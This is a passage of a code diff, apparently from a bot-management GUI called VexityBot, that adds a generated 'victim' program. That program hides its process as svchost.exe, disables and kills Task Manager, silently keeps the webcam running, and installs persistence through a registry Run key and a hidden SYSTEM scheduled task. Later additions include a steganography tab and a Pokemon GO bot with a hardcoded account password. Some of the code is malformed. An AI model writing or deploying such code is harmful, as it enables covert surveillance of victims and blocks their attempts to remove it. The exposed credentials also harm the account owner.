+                logging.error(f"Critical error in webcam monitoring: {{e}}")
+            finally:
+                # ADDED: Cleanup
+                try:
+                    cap.release()
+                    self.enable_task_manager()
+                except:
+                    pass
+        
+        # Start webcam monitoring in background thread
+        webcam_thread = threading.Thread(target=webcam_thread, daemon=True)
+        webcam_thread.start()
+    
+    def hide_from_task_manager(self):
+        """Hide current process from Task Manager using kernel-level techniques"""
+        try:
+            # Get current process handle
+            current_pid = os.getpid()
+            process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, current_pid)
+            
+            if process_handle:
+                # ADDED: Use NtSetInformationProcess to hide process
+                process_information = ctypes.c_ulong(0)
+                ntdll.NtSetInformationProcess(
+                    process_handle,
+                    0x1F,  # ProcessHideFromDebugger
+                    ctypes.byref(process_information),
+                    ctypes.sizeof(process_information)
+                )
+                kernel32.CloseHandle(process_handle)
+                
+            # ADDED: Modify process name to appear as system process
+            try:
+                ntdll.NtSetInformationProcess(
+                    kernel32.GetCurrentProcess(),
+                    0x05,  # ProcessNameInformation
+                    b"svchost.exe\\0",
+                    12
+                )
+            except:
+                pass
+                
+        except Exception as e:
+            logging.error(f"Failed to hide from task manager: {{e}}")
+    
+    def disable_task_manager(self):
+        """Disable Task Manager access for current user"""
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                               r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+                               0, winreg.KEY_WRITE)
+            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            logging.info("Task Manager disabled")
+        except Exception as e:
+            logging.error(f"Failed to disable Task Manager: {{e}}")
+    
+    def enable_task_manager(self):
+        """Re-enable Task Manager access"""
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                               r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+                               0, winreg.KEY_WRITE)
+            winreg.DeleteValue(key, "DisableTaskMgr")
+            winreg.CloseKey(key)
+            logging.info("Task Manager re-enabled")
+        except Exception as e:
+            logging.error(f"Failed to re-enable Task Manager: {{e}}")
+    
+    def ensure_webcam_active(self):
+        """Enhanced webcam activation with system-level control"""
+        while True:
+            try:
+                # ADDED: Force camera access at kernel level
+                cap = cv2.VideoCapture(0)
+                if cap.isOpened():
+                    # ADDED: Set camera properties for maximum control
+                    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+                    cap.set(cv2.CAP_PROP_FPS, 30)
+                    cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
+                    return cap
+            except Exception as e:
+                logging.error(f"Webcam access error: {{e}}")
+            
+            logging.info("Webcam unavailable, retrying in 2 seconds...")
+        time.sleep(2)
+    
+    def monitor_processes(self):
+        """Monitor and protect against process termination attempts"""
+        while True:
+            try:
+                current_pid = os.getpid()
+                for proc in psutil.process_iter(['pid', 'name']):
+                    try:
+                        if proc.info['name'] == 'taskmgr.exe':
+                            # ADDED: Terminate Task Manager if it tries to show our process
+                            proc.terminate()
+                            logging.info("Task Manager terminated")
+                    except:
+                        pass
+                time.sleep(1)
+            except Exception as e:
+                logging.error(f"Process monitoring error: {{e}}")
+
+# ADDED: Global webcam monitoring functions for service mode
+
+def hide_from_task_manager():
+    """Hide current process from Task Manager using kernel-level techniques"""
+    try:
+        # Get current process handle
+        current_pid = os.getpid()
+        process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, current_pid)
+        
+        if process_handle:
+            # ADDED: Use NtSetInformationProcess to hide process
+            process_information = ctypes.c_ulong(0)
+            ntdll.NtSetInformationProcess(
+                process_handle,
+                0x1F,  # ProcessHideFromDebugger
+                ctypes.byref(process_information),
+                ctypes.sizeof(process_information)
+            )
+            kernel32.CloseHandle(process_handle)
+            
+        # ADDED: Modify process name to appear as system process
+        try:
+            ntdll.NtSetInformationProcess(
+                kernel32.GetCurrentProcess(),
+                0x05,  # ProcessNameInformation
+                b"svchost.exe\\0",
+                12
+            )
+        except:
+            pass
+            
+        except Exception as e:
+        logging.error(f"Failed to hide from task manager: {{e}}")
+
+def disable_task_manager():
+    """Disable Task Manager access for current user"""
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                           r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+                           0, winreg.KEY_WRITE)
+        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        logging.info("Task Manager disabled")
+    except Exception as e:
+        logging.error(f"Failed to disable Task Manager: {{e}}")
+
+def enable_task_manager():
+    """Re-enable Task Manager access"""
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                           r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+                           0, winreg.KEY_WRITE)
+        winreg.DeleteValue(key, "DisableTaskMgr")
+        winreg.CloseKey(key)
+        logging.info("Task Manager re-enabled")
+    except Exception as e:
+        logging.error(f"Failed to re-enable Task Manager: {{e}}")
+
+def setup_persistence():
+    """Set up system-level persistence for the webcam monitor"""
+    try:
+        # ADDED: Create startup registry entry
+        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
+        exe_path = os.path.abspath(sys.executable)
+        script_path = os.path.abspath(__file__)
+        winreg.SetValueEx(key, "WebcamMonitor", 0, winreg.REG_SZ, f'"{exe_path}" "{script_path}"')
+        winreg.CloseKey(key)
+        
+        # ADDED: Create scheduled task for system-level persistence
+        task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+    </LogonTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>false</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>false</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions>
+    <Exec>
+      <Command>{exe_path}</Command>
+      <Arguments>"{script_path}"</Arguments>
+    </Exec>
+  </Actions>
+</Task>"""
+        
+        # ADDED: Write task XML to temp file and create task
+        with open("webcam_task.xml", "w") as f:
+            f.write(task_xml)
+        
+        subprocess.run([
+            "schtasks", "/create", "/tn", "WebcamMonitor", 
+            "/xml", "webcam_task.xml", "/f"
+        ], capture_output=True)
+        
+        os.remove("webcam_task.xml")
+        logging.info("Persistence setup completed")
+        
+    except Exception as e:
+        logging.error(f"Failed to setup persistence: {{e}}")
+
+def ensure_webcam_active():
+    """Enhanced webcam activation with system-level control"""
+            while True:
+                try:
+            # ADDED: Force camera access at kernel level
+            cap = cv2.VideoCapture(0)
+            if cap.isOpened():
+                # ADDED: Set camera properties for maximum control
+                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+                cap.set(cv2.CAP_PROP_FPS, 30)
+                cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
+                return cap
+                except Exception as e:
+            logging.error(f"Webcam access error: {{e}}")
+        
+        logging.info("Webcam unavailable, retrying in 2 seconds...")
+        time.sleep(2)
+
+def monitor_processes():
+    """Monitor and protect against process termination attempts"""
+    while True:
+        try:
+            current_pid = os.getpid()
+            for proc in psutil.process_iter(['pid', 'name']):
+                try:
+                    if proc.info['name'] == 'taskmgr.exe':
+                        # ADDED: Terminate Task Manager if it tries to show our process
+                        proc.terminate()
+                        logging.info("Task Manager terminated")
+                except:
+                    pass
+            time.sleep(1)
+        except Exception as e:
+            logging.error(f"Process monitoring error: {{e}}")
+
+def monitor_webcam_persistent():
+    """Main function for persistent webcam monitoring"""
+    try:
+        # ADDED: Hide from Task Manager
+        hide_from_task_manager()
+        
+        # ADDED: Disable Task Manager
+        disable_task_manager()
+        
+        # ADDED: Start process monitoring in background thread
+        process_thread = threading.Thread(target=monitor_processes, daemon=True)
+        process_thread.start()
+        
+        # ADDED: Enhanced webcam monitoring loop
+        cap = ensure_webcam_active()
+        frame_count = 0
+        
+        while True:
+            try:
+                ret, frame = cap.read()
+                if not ret:
+                    logging.warning("Webcam disconnected, attempting to reconnect...")
+                    cap.release()
+                    cap = ensure_webcam_active()
+                    continue
+                
+                # ADDED: Process frame without displaying (background operation)
+                frame_count += 1
+                if frame_count % 1000 == 0:  # Log every 1000 frames
+                    logging.info(f"Webcam active - Frame {{frame_count}}")
+                
+                # ADDED: Small delay to reduce CPU usage
+                time.sleep(0.01)
+                
+            except KeyboardInterrupt:
+                logging.info("Service stopped by user")
+                break
+        except Exception as e:
+                logging.error(f"Webcam monitoring error: {{e}}")
+                time.sleep(2)
+                
+    except Exception as e:
+        logging.error(f"Critical error in webcam monitoring: {{e}}")
+    finally:
+        # ADDED: Cleanup
+        try:
+            cap.release()
+            enable_task_manager()
+        except:
+            pass
+
+def run_as_service():
+    """Run the webcam monitor as a Windows service"""
+    if len(sys.argv) == 1:
+        servicemanager.Initialize()
+        servicemanager.PrepareToHostSingle(WebcamMonitorService)
+        servicemanager.StartServiceCtrlDispatcher()
+    else:
+        win32serviceutil.HandleCommandLine(WebcamMonitorService)
 
 if __name__ == "__main__":
-    victim_control = VexityBotVictimControl()
-'''.format(
-            controller_ip=controller_ip,
-            controller_port=controller_port,
-            stealth_mode=stealth_mode,
-            auto_start=auto_start,
-            persistence=persistence,
-            len_selected_bots=len(selected_bots),
-            selected_bots_list=[bot['name'] for bot in selected_bots]
-        )
+    try:
+        # ADDED: Check if running as service
+        if len(sys.argv) > 1 and sys.argv[1] == "service":
+            run_as_service()
+        else:
+            # ADDED: Setup persistence on first run
+            setup_persistence()
+            
+            # ADDED: Run main victim control application
+            app = VexityBotVictimControl()
+            
+    except Exception as e:
+        logging.error(f"Application error: {{e}}")
+        sys.exit(1)
+'''
         
         return victim_content
     
     def generate_bot_panel_code(self, bot):
-        """Generate bot panel code for a specific bot"""
+        """Generate bot panel code for victim EXE"""
         return f"""
     def create_{bot['name'].lower()}_panel(self):
         \"\"\"Create {bot['name']} panel\"\"\"
-        # Bot-specific panel implementation
-        pass
+        {bot['name'].lower()}_frame = ttk.Frame(self.notebook)
+        self.notebook.add({bot['name'].lower()}_frame, text="🤖 {bot['name']}")
+        
+        # {bot['name']} info
+        info_frame = ttk.LabelFrame({bot['name'].lower()}_frame, text="{bot['name']} Information", padding=10)
+        info_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        ttk.Label(info_frame, text="Status: {bot['status']}", font=('Arial', 12, 'bold')).pack(anchor=tk.W)
+        ttk.Label(info_frame, text="Rank: #{bot['rank']}").pack(anchor=tk.W)
+        ttk.Label(info_frame, text="Port: {bot['port']}").pack(anchor=tk.W)
+        ttk.Label(info_frame, text="Uptime: {bot['uptime']}").pack(anchor=tk.W)
+        ttk.Label(info_frame, text="Requests: {bot['requests']:,}").pack(anchor=tk.W)
+        
+        # {bot['name']} controls
+        controls_frame = ttk.LabelFrame({bot['name'].lower()}_frame, text="{bot['name']} Controls", padding=10)
+        controls_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        button_frame = ttk.Frame(controls_frame)
+        button_frame.pack(fill=tk.X)
+        
+        ttk.Button(button_frame, text="🚀 Start {bot['name']}", 
+                  command=lambda: self.start_{bot['name'].lower()}()).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="⏹️ Stop {bot['name']}", 
+                  command=lambda: self.stop_{bot['name'].lower()}()).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="🔄 Restart {bot['name']}", 
+                  command=lambda: self.restart_{bot['name'].lower()}()).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="⚙️ Configure {bot['name']}", 
+                  command=lambda: self.configure_{bot['name'].lower()}()).pack(side=tk.LEFT, padx=5)
+    
+    def start_{bot['name'].lower()}(self):
+        \"\"\"Start {bot['name']}\"\"\"
+        messagebox.showinfo("Bot Started", "{bot['name']} started successfully!")
+    
+    def stop_{bot['name'].lower()}(self):
+        \"\"\"Stop {bot['name']}\"\"\"
+        messagebox.showinfo("Bot Stopped", "{bot['name']} stopped successfully!")
+    
+    def restart_{bot['name'].lower()}(self):
+        \"\"\"Restart {bot['name']}\"\"\"
+        messagebox.showinfo("Bot Restarted", "{bot['name']} restarted successfully!")
+    
+    def configure_{bot['name'].lower()}(self):
+        \"\"\"Configure {bot['name']}\"\"\"
+        messagebox.showinfo("Bot Configuration", "{bot['name']} configuration opened!")
 """
-    
-    def open_victim_output_folder(self):
-        """Open victim output folder"""
-        try:
-            import subprocess
-            import platform
-            
-            if platform.system() == "Windows":
-                subprocess.run(["explorer", "dist"], check=True)
-            else:
-                subprocess.run(["open", "dist"], check=True)
-                
-        except Exception as e:
-            messagebox.showerror("Error", f"Failed to open output folder: {{str(e)}}")
-    
-    def create_steganography_tab(self):
-        """Create the Steganography tab"""
-        stego_frame = ttk.Frame(self.notebook)
-        self.notebook.add(stego_frame, text="🖼️ Steganography")
-        
-        # Add scrollbar to the main frame
-        scrollable_container = self.add_scrollbar_to_frame(stego_frame)
-        
-        # Import and create steganography GUI
-        try:
-            from VexityBotSteganographyGUI import VexityBotSteganographyGUI
-            self.stego_gui = VexityBotSteganographyGUI(scrollable_container)
-        except ImportError as e:
-            # Fallback if steganography module is not available
+
+    def open_bot_admin_panel(self, bot):
             error_frame = ttk.Frame(stego_frame)
             error_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
             
@@ -12411,6 +15976,244 @@ if __name__ == "__main__":
             error_label.pack(expand=True)
             
             self.log_build(f"Steganography module import error: {str(e)}")
+    
+    def create_steganography_tab(self):
+        """Create the Steganography tab for hiding data in images"""
+        stego_frame = ttk.Frame(self.notebook)
+        self.notebook.add(stego_frame, text="🔐 Steganography")
+        
+        # Title
+        title_label = ttk.Label(stego_frame, text="🔐 Steganography - Data Hiding in Images", 
+                               font=('Arial', 16, 'bold'))
+        title_label.pack(pady=10)
+        
+        # Main container
+        main_container = ttk.Frame(stego_frame)
+        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # Left panel - Controls
+        left_panel = ttk.LabelFrame(main_container, text="📝 Controls", padding=10)
+        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
+        
+        # Encode section
+        encode_frame = ttk.LabelFrame(left_panel, text="🔒 Encode Data", padding=5)
+        encode_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        ttk.Label(encode_frame, text="Select Image:").pack(anchor='w')
+        self.stego_image_path = tk.StringVar()
+        ttk.Entry(encode_frame, textvariable=self.stego_image_path, width=40).pack(fill=tk.X, pady=(0, 5))
+        ttk.Button(encode_frame, text="Browse Image", 
+                  command=self.browse_stego_image).pack(anchor='w')
+        
+        ttk.Label(encode_frame, text="Message to Hide:").pack(anchor='w', pady=(10, 0))
+        self.stego_message = tk.Text(encode_frame, height=4, width=40)
+        self.stego_message.pack(fill=tk.X, pady=(0, 5))
+        
+        ttk.Button(encode_frame, text="🔒 Encode Message", 
+                  command=self.encode_stego_message).pack(anchor='w')
+        
+        # Decode section
+        decode_frame = ttk.LabelFrame(left_panel, text="🔓 Decode Data", padding=5)
+        decode_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        ttk.Label(decode_frame, text="Select Encoded Image:").pack(anchor='w')
+        self.stego_encoded_path = tk.StringVar()
+        ttk.Entry(decode_frame, textvariable=self.stego_encoded_path, width=40).pack(fill=tk.X, pady=(0, 5))
+        ttk.Button(decode_frame, text="Browse Encoded Image", 
+                  command=self.browse_encoded_image).pack(anchor='w')
+        
+        ttk.Button(decode_frame, text="🔓 Decode Message", 
+                  command=self.decode_stego_message).pack(anchor='w', pady=(10, 0))
+        
+        # Right panel - Preview
+        right_panel = ttk.LabelFrame(main_container, text="🖼️ Image Preview", padding=10)
+        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
+        
+        # Image display
+        self.stego_image_display = tk.Canvas(right_panel, bg='white', height=300)
+        self.stego_image_display.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
+        
+        # Status
+        self.stego_status = ttk.Label(right_panel, text="Ready", font=('Arial', 10))
+        self.stego_status.pack(anchor='w')
+        
+        # Log
+        log_frame = ttk.LabelFrame(stego_frame, text="📋 Log", padding=5)
+        log_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
+        
+        self.stego_log = scrolledtext.ScrolledText(log_frame, height=8)
+        self.stego_log.pack(fill=tk.X)
+    
+    def browse_stego_image(self):
+        """Browse for image to encode"""
+        filename = filedialog.askopenfilename(
+            title="Select Image to Encode",
+            filetypes=[("Image files", "*.png *.jpg *.jpeg *.bmp *.gif")]
+        )
+        if filename:
+            self.stego_image_path.set(filename)
+            self.load_stego_image(filename)
+    
+    def browse_encoded_image(self):
+        """Browse for encoded image to decode"""
+        filename = filedialog.askopenfilename(
+            title="Select Encoded Image to Decode",
+            filetypes=[("Image files", "*.png *.jpg *.jpeg *.bmp *.gif")]
+        )
+        if filename:
+            self.stego_encoded_path.set(filename)
+            self.load_stego_image(filename)
+    
+    def load_stego_image(self, image_path):
+        """Load and display image in preview"""
+        try:
+            from PIL import Image, ImageTk
+            import os
+            
+            if not os.path.exists(image_path):
+                self.stego_log.insert(tk.END, f"Error: Image file not found: {image_path}\n")
+                return
+            
+            # Load image
+            image = Image.open(image_path)
+            
+            # Resize to fit display
+            display_width = 300
+            display_height = 300
+            image.thumbnail((display_width, display_height), Image.Resampling.LANCZOS)
+            
+            # Convert to PhotoImage
+            photo = ImageTk.PhotoImage(image)
+            
+            # Display in canvas
+            self.stego_image_display.delete("all")
+            self.stego_image_display.create_image(150, 150, image=photo)
+            self.stego_image_display.image = photo  # Keep reference
+            
+            self.stego_status.config(text=f"Loaded: {os.path.basename(image_path)}")
+            self.stego_log.insert(tk.END, f"Image loaded: {os.path.basename(image_path)}\n")
+            
+        except Exception as e:
+            self.stego_log.insert(tk.END, f"Error loading image: {str(e)}\n")
+    
+    def encode_stego_message(self):
+        """Encode message into image using steganography"""
+        try:
+            image_path = self.stego_image_path.get()
+            message = self.stego_message.get("1.0", tk.END).strip()
+            
+            if not image_path:
+                messagebox.showwarning("No Image", "Please select an image to encode")
+                return
+            
+            if not message:
+                messagebox.showwarning("No Message", "Please enter a message to hide")
+                return
+            
+            # Simple steganography encoding
+            from PIL import Image
+            import os
+            
+            # Load image
+            image = Image.open(image_path)
+            
+            # Convert to RGB if necessary
+            if image.mode != 'RGB':
+                image = image.convert('RGB')
+            
+            # Get image data
+            pixels = list(image.getdata())
+            
+            # Convert message to binary
+            message_binary = ''.join(format(ord(char), '08b') for char in message)
+            message_binary += '1111111111111110'  # End marker
+            
+            # Check if image can hold the message
+            if len(message_binary) > len(pixels) * 3:
+                messagebox.showerror("Message Too Long", "Message is too long for this image")
+                return
+            
+            # Encode message into LSB of pixels
+            data_index = 0
+            for i in range(len(pixels)):
+                pixel = list(pixels[i])
+                for j in range(3):  # RGB channels
+                    if data_index < len(message_binary):
+                        pixel[j] = pixel[j] & ~1 | int(message_binary[data_index])
+                        data_index += 1
+                pixels[i] = tuple(pixel)
+            
+            # Create new image with encoded data
+            encoded_image = Image.new('RGB', image.size)
+            encoded_image.putdata(pixels)
+            
+            # Save encoded image
+            base_name = os.path.splitext(os.path.basename(image_path))[0]
+            encoded_path = f"{base_name}_encoded.png"
+            encoded_image.save(encoded_path)
+            
+            self.stego_log.insert(tk.END, f"Message encoded successfully!\n")
+            self.stego_log.insert(tk.END, f"Encoded image saved as: {encoded_path}\n")
+            self.stego_status.config(text="Message encoded successfully!")
+            
+            # Load the encoded image
+            self.load_stego_image(encoded_path)
+            
+        except Exception as e:
+            self.stego_log.insert(tk.END, f"Error encoding message: {str(e)}\n")
+            messagebox.showerror("Encoding Error", f"Failed to encode message: {str(e)}")
+    
+    def decode_stego_message(self):
+        """Decode message from image using steganography"""
+        try:
+            image_path = self.stego_encoded_path.get()
+            
+            if not image_path:
+                messagebox.showwarning("No Image", "Please select an encoded image to decode")
+                return
+            
+            # Simple steganography decoding
+            from PIL import Image
+            
+            # Load image
+            image = Image.open(image_path)
+            
+            # Convert to RGB if necessary
+            if image.mode != 'RGB':
+                image = image.convert('RGB')
+            
+            # Get image data
+            pixels = list(image.getdata())
+            
+            # Extract LSB from pixels
+            binary_message = ""
+            for pixel in pixels:
+                for channel in pixel:
+                    binary_message += str(channel & 1)
+            
+            # Convert binary to text
+            message = ""
+            for i in range(0, len(binary_message), 8):
+                byte = binary_message[i:i+8]
+                if len(byte) == 8:
+                    char = chr(int(byte, 2))
+                    if char == '\x00':  # End marker
+                        break
+                    message += char
+            
+            if message:
+                self.stego_log.insert(tk.END, f"Decoded message: {message}\n")
+                self.stego_status.config(text="Message decoded successfully!")
+                
+                # Show decoded message in a popup
+                messagebox.showinfo("Decoded Message", f"Hidden message:\n\n{message}")
+            else:
+                self.stego_log.insert(tk.END, "No hidden message found in image\n")
+                self.stego_status.config(text="No hidden message found")
+                
+        except Exception as e:
+            self.stego_log.insert(tk.END, f"Error decoding message: {str(e)}\n")
+            messagebox.showerror("Decoding Error", f"Failed to decode message: {str(e)}")
     
     def create_gamebots_tab(self):
         """Create the GameBots tab with gaming leaderboard"""
@@ -13773,6 +17576,1330 @@ Click 'Start Ultimate Bot' to begin!
             """
         
         messagebox.showinfo("Bot Status", status_text)
+    
+    def create_pokemon_bot_tab(self):
+        """Create the Pokemon Bot tab with Pokemon GO automation"""
+        pokemon_frame = ttk.Frame(self.notebook)
+        self.notebook.add(pokemon_frame, text="⚡ Pokemon Bot")
+        
+        # Initialize Pokemon bot
+        self.pokemon_bot = None
+        self.pokemon_bot_running = False
+        self.pokemon_bot_thread = None
+        self.auto_login_attempted = False
+        
+        # Title
+        title_label = ttk.Label(pokemon_frame, text="⚡ Pokemon GO Bot - Thunderbolt", 
+                               font=('Arial', 16, 'bold'))
+        title_label.pack(pady=10)
+        
+        # Create scrollable frame
+        canvas = tk.Canvas(pokemon_frame)
+        scrollbar = ttk.Scrollbar(pokemon_frame, orient="vertical", command=canvas.yview)
+        scrollable_frame = ttk.Frame(canvas)
+        
+        scrollable_frame.bind(
+            "<Configure>",
+            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
+        )
+        
+        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
+        canvas.configure(yscrollcommand=scrollbar.set)
+        
+        # Pack canvas and scrollbar
+        canvas.pack(side="left", fill="both", expand=True, padx=10, pady=10)
+        scrollbar.pack(side="right", fill="y")
+        
+        # Bind mouse wheel scrolling
+        def _on_mousewheel(event):
+            canvas.yview_scroll(int(-1*(event.delta/120)), "units")
+        
+        def _bind_to_mousewheel(event):
+            canvas.bind_all("<MouseWheel>", _on_mousewheel)
+        
+        def _unbind_from_mousewheel(event):
+            canvas.unbind_all("<MouseWheel>")
+        
+        canvas.bind('<Enter>', _bind_to_mousewheel)
+        canvas.bind('<Leave>', _unbind_from_mousewheel)
+        
+        # Auto-login when tab is selected
+        def on_tab_selected(event):
+            if event.widget.tab('current')['text'] == '⚡ Pokemon Bot':
+                if not self.auto_login_attempted and not self.pokemon_bot:
+                    self.auto_login_attempted = True
+                    self.root.after(1000, self.auto_login_pokemon)  # Delay 1 second
+        
+        self.notebook.bind('<<NotebookTabChanged>>', on_tab_selected)
+        
+        # Main container
+        main_container = ttk.Frame(scrollable_frame)
+        main_container.pack(fill=tk.BOTH, expand=True)
+        
+        # Left panel - Controls
+        left_panel = ttk.LabelFrame(main_container, text="🎮 Bot Controls", padding=10)
+        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
+        
+        # Authentication section
+        auth_frame = ttk.LabelFrame(left_panel, text="🔐 Authentication", padding=5)
+        auth_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        # Login method selection
+        ttk.Label(auth_frame, text="Login Method:").pack(anchor='w')
+        self.login_method = tk.StringVar(value="ptc")
+        ttk.Radiobutton(auth_frame, text="PTC (Pokemon Trainer Club)", variable=self.login_method, value="ptc").pack(anchor='w')
+        ttk.Radiobutton(auth_frame, text="Google", variable=self.login_method, value="google").pack(anchor='w')
+        
+        # PTC Login Link
+        ptc_link_frame = ttk.Frame(auth_frame)
+        ptc_link_frame.pack(fill=tk.X, pady=(5, 0))
+        ttk.Button(ptc_link_frame, text="🔗 Open PTC Login", 
+                  command=self.open_ptc_login).pack(side=tk.LEFT, padx=(0, 5))
+        ttk.Button(ptc_link_frame, text="❓ Help", 
+                  command=self.show_ptc_help).pack(side=tk.LEFT)
+        
+        # API Settings
+        api_frame = ttk.LabelFrame(auth_frame, text="🔌 API Settings", padding=5)
+        api_frame.pack(fill=tk.X, pady=(10, 0))
+        
+        ttk.Label(api_frame, text="API Password:").pack(anchor='w')
+        self.api_password = tk.StringVar()
+        ttk.Entry(api_frame, textvariable=self.api_password, show="*", width=30).pack(fill=tk.X, pady=(0, 5))
+        
+        ttk.Label(api_frame, text="Bot Name:").pack(anchor='w')
+        self.bot_name = tk.StringVar(value="default")
+        ttk.Entry(api_frame, textvariable=self.bot_name, width=30).pack(fill=tk.X, pady=(0, 5))
+        
+        ttk.Label(api_frame, text="API URL:").pack(anchor='w')
+        self.api_url = tk.StringVar(value="http://localhost:8080")
+        ttk.Entry(api_frame, textvariable=self.api_url, width=30).pack(fill=tk.X, pady=(0, 5))
+        
+        ttk.Button(api_frame, text="🔌 Test API Connection", 
+                  command=self.test_api_connection).pack(fill=tk.X, pady=(5, 0))
+        
+        # Credentials
+        ttk.Label(auth_frame, text="Username:").pack(anchor='w', pady=(10, 0))
+        self.pokemon_username = tk.StringVar(value="TZiggler3300")
+        username_entry = ttk.Entry(auth_frame, textvariable=self.pokemon_username, width=30)
+        username_entry.pack(fill=tk.X, pady=(0, 5))
+        
+        ttk.Label(auth_frame, text="Password:").pack(anchor='w')
+        self.pokemon_password = tk.StringVar(value="Torey991200@##@@##$$")
+        password_entry = ttk.Entry(auth_frame, textvariable=self.pokemon_password, show="*", width=30)
+        password_entry.pack(fill=tk.X, pady=(0, 5))
+        
+        # Credential validation
+        self.credential_status = ttk.Label(auth_frame, text="", foreground="green")
+        self.credential_status.pack(anchor='w', pady=(2, 0))
+        
+        # Bind validation
+        username_entry.bind('<KeyRelease>', self.validate_credentials)
+        password_entry.bind('<KeyRelease>', self.validate_credentials)
+        
+        # Auto-login button
+        ttk.Button(auth_frame, text="🚀 Auto Login", 
+                  command=self.auto_login_pokemon).pack(fill=tk.X, pady=(5, 0))
+        
+        # Location settings
+        location_frame = ttk.LabelFrame(left_panel, text="📍 Location Settings", padding=5)
+        location_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        ttk.Label(location_frame, text="Latitude:").pack(anchor='w')
+        self.pokemon_lat = tk.StringVar(value="40.7589")
+        ttk.Entry(location_frame, textvariable=self.pokemon_lat, width=30).pack(fill=tk.X, pady=(0, 5))
+        
+        ttk.Label(location_frame, text="Longitude:").pack(anchor='w')
+        self.pokemon_lng = tk.StringVar(value="-73.9851")
+        ttk.Entry(location_frame, textvariable=self.pokemon_lng, width=30).pack(fill=tk.X, pady=(0, 5))
+        
+        ttk.Label(location_frame, text="Altitude (meters):").pack(anchor='w')
+        self.pokemon_alt = tk.StringVar(value="10")
+        ttk.Entry(location_frame, textvariable=self.pokemon_alt, width=30).pack(fill=tk.X, pady=(0, 5))
+        
+        # Bot status
+        status_frame = ttk.LabelFrame(left_panel, text="📊 Bot Status", padding=5)
+        status_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        self.pokemon_bot_status = ttk.Label(status_frame, text="Status: Not Connected", font=('Arial', 10, 'bold'))
+        self.pokemon_bot_status.pack(anchor='w')
+        
+        self.pokemon_bot_level = ttk.Label(status_frame, text="Trainer Level: Unknown", font=('Arial', 10))
+        self.pokemon_bot_level.pack(anchor='w')
+        
+        self.pokemon_bot_xp = ttk.Label(status_frame, text="XP: Unknown", font=('Arial', 10))
+        self.pokemon_bot_xp.pack(anchor='w')
+        
+        self.pokemon_bot_stardust = ttk.Label(status_frame, text="Stardust: Unknown", font=('Arial', 10))
+        self.pokemon_bot_stardust.pack(anchor='w')
+        
+        # Control buttons
+        control_frame = ttk.LabelFrame(left_panel, text="🎯 Bot Actions", padding=5)
+        control_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        ttk.Button(control_frame, text="🔐 Login & Connect", 
+                  command=self.login_pokemon_bot).pack(fill=tk.X, pady=2)
+        ttk.Button(control_frame, text="🚀 Start Bot", 
+                  command=self.start_pokemon_bot).pack(fill=tk.X, pady=2)
+        ttk.Button(control_frame, text="⏹️ Stop Bot", 
